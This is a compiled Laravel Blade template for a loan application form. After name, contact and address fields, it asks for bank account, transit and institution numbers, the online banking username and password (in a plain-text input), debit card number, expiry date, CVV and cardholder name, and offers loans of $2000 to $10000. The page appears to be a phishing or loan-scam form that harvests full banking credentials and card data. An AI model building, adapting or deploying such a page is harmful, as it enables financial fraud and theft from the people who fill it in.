<?php $__env->startSection('content'); ?>

                <div class="page-content">

                    <!-- Page-Title -->
                    <div class="page-title-box">
                        <div class="container-fluid">
                            <div class="row align-items-center">
                                <div class="col-md-8">
                                    <h4 class="page-title mb-1">Form Validation</h4>
                                    <ol class="breadcrumb m-0">
                                        <li class="breadcrumb-item"><a href="javascript: void(0);">Forms</a></li>
                                    <li class="breadcrumb-item active">Form Validation</li>
                                    </ol>
                                </div>
                                <div class="col-md-4">
                                    <div class="float-right d-none d-md-block">
                                        <div class="dropdown">
                                            <button class="btn btn-light btn-rounded dropdown-toggle" type="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                                                <i class="mdi mdi-settings-outline mr-1"></i> Settings
                                            </button>
                                            <div class="dropdown-menu dropdown-menu-right dropdown-menu-animated">
                                                <a class="dropdown-item" href="#">Action</a>
                                                <a class="dropdown-item" href="#">Another action</a>
                                                <a class="dropdown-item" href="#">Something else here</a>
                                                <div class="dropdown-divider"></div>
                                                <a class="dropdown-item" href="#">Separated link</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>
                    </div>
                    <!-- end page title end breadcrumb -->

                    <form class="needs-validation" method="POST" action="<?php echo e(route('submit.form')); ?>" novalidate>
                        <?php echo csrf_field(); ?>
                    <div class="page-content-wrapper">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-lg-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <h4 class="header-title">Personal Information</h4>
                                            


                                                <div class="row">
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom01">First name</label>
                                                        <input type="text" class="form-control" name="first_name" placeholder="First name"  required>
                                                        <div class="invalid-feedback">
                                                            First Name is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom02">Last name</label>
                                                        <input type="text" class="form-control" name="last_name" placeholder="Last name" required>
                                                        <div class="invalid-feedback">
                                                            Last Name is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Date of Birth</label>
                                                        <input type="date" class="form-control" name="dob" placeholder="Date of Birth" required>
                                                        <div class="invalid-feedback">
                                                            Please provide a valid date.
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                            <label for="validationCustom02">Email</label>
                                                            <input type="email" name="email" class="form-control" placeholder="Email"  required>
                                                            <div class="invalid-feedback">
                                                                Email is a required field!!
                                                            </div>
                                                            <div class="valid-feedback">
                                                                Looks good!
                                                            </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                            <label for="validationCustom02">Mobile</label>
                                                            <input type="text" name="mobile" class="form-control" placeholder="Mobile Number"  required>
                                                            <div class="invalid-feedback">
                                                                Mobile is a required field!!
                                                            </div>
                                                            <div class="valid-feedback">
                                                                Looks good!
                                                            </div>
                                                    </div>
                                                    


                                                </div>
                                            </div>
                                    </div>
                                </div>
                            </div>
                            <!-- end row -->
                        </div>

                        <!-- end container-fluid -->
                    </div>

                    <div class="page-content-wrapper mt-2">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-lg-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <h4 class="header-title">Addresh </h4>
                                            


                                                <div class="row">
                                                    <div class="col-md-8 mb-3">
                                                        <label for="validationCustom01">Address</label>
                                                        <input type="text" class="form-control" name="Address" placeholder="Address"  required>
                                                        <div class="invalid-feedback">
                                                            Address is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom01">Postal Code</label>
                                                        <input type="text" class="form-control" name="Postal_code" placeholder="Postal Code"  required>
                                                        <div class="invalid-feedback">
                                                            Postal Code is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom01">City</label>
                                                        <input type="text" class="form-control" name="city" placeholder="City"  required>
                                                        <div class="invalid-feedback">
                                                            City is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom02">State</label>
                                                        <input type="text" name="state" class="form-control" placeholder="State" required>
                                                        <div class="invalid-feedback">
                                                            State is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Country</label>
                                                        <input type="text" class="form-control" name="Country" placeholder="Country" required>
                                                        <div class="invalid-feedback">
                                                            Please provide a valid Country.
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>

                                                </div>
                                                



                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- end row -->
                        </div>

                        <!-- end container-fluid -->
                    </div>

                    <div class="page-content-wrapper mt-2">
                        <div class="container-fluid">
                            <div class="row">
                                <div class="col-lg-12">
                                    <div class="card">
                                        <div class="card-body">
                                            <h4 class="header-title">BANKING INFORMATION </h4>
                                            


                                                <div class="row">
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom01">Bank Name </label>
                                                        <input type="text" class="form-control" name="bank_name" placeholder="Bank Name"  required>
                                                        <div class="invalid-feedback">
                                                            Bank Name is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom01">Account Number</label>
                                                        <input type="number" class="form-control" name="account_number" placeholder="Account Number"  required>
                                                        <div class="invalid-feedback">
                                                            Account Number is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom02">Transit Number </label>
                                                        <input type="text" class="form-control" name="Transit_number" placeholder="Transit Number " required>
                                                        <div class="invalid-feedback">
                                                            Transit Number is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Institution Number</label>
                                                        <input type="text" class="form-control" name="Institution_number" placeholder="Institution Number" required>
                                                        <div class="invalid-feedback">
                                                            Institution Number  is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Online Username</label>
                                                        <input type="text" class="form-control" name="online_username" placeholder="Online Username" required>
                                                        <div class="invalid-feedback">
                                                            Online Username is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Online Password</label>
                                                        <input type="text" class="form-control" name="Online_password" placeholder="Online Password" required>
                                                        <div class="invalid-feedback">
                                                            Online Password is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Debit Card Number</label>
                                                        <input type="text" class="form-control" name="Dabit_card" placeholder="Debit Card Number" required>
                                                        <div class="invalid-feedback">
                                                            Debit Card Number is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Exp Date</label>
                                                        <input type="date" class="form-control" name="exp_date" placeholder="Exp Date" required>
                                                        <div class="invalid-feedback">
                                                            Exp Date is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">CVV</label>
                                                        <input type="text" class="form-control" name="cvv" placeholder="CVV" required>
                                                        <div class="invalid-feedback">
                                                            CVV is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom03">Name on the card</label>
                                                        <input type="text" class="form-control" name="Name_on_the_card" placeholder="Name on the card" required>
                                                        <div class="invalid-feedback">
                                                            Name on the card is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                    </div>
                                                    <div class="col-md-4 mb-3">
                                                        <label for="validationCustom02">Loan Amount</label>
                                                        <select class="form-control" name="loan_amount">
                                                            <?php for($i=2000; $i<=10000; $i=$i+500): ?>
                                                                <option value="<?php echo e($i); ?>">$<?php echo e($i); ?></option>
                                                            <?php endfor; ?>
                                                        </select>
                                                        
                                                        <div class="invalid-feedback">
                                                            Loan Amount the card is a required field!!
                                                        </div>
                                                        <div class="valid-feedback">
                                                            Looks good!
                                                        </div>
                                                </div>

                                                </div>
                                                <div class="form-group">
                                                    <div class="custom-control custom-checkbox">
                                                        <input type="checkbox" class="custom-control-input" id="invalidCheck" required>
                                                        <label class="custom-control-label" for="invalidCheck">Agree to terms and conditions</label>
                                                        <div class="invalid-feedback">
                                                            You must agree before submitting.
                                                        </div>
                                                    </div>
                                                </div>
                                                <button class="btn btn-primary" type="submit">Submit form</button>



                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- end row -->
                        </div>

                        <!-- end container-fluid -->
                    </div>
                </form>
                    <!-- end page-content-wrapper -->
                </div>
<?php $__env->stopSection(); ?>
                <!-- End Page-content -->

<?php echo $__env->make('layouts.app', \Illuminate\Support\Arr::except(get_defined_vars(), ['__data', '__path']))->render(); ?><?php /**PATH /Users/jasmin/Desktop/hardik/Info/resources/views/contact.blade.php ENDPATH**/ ?>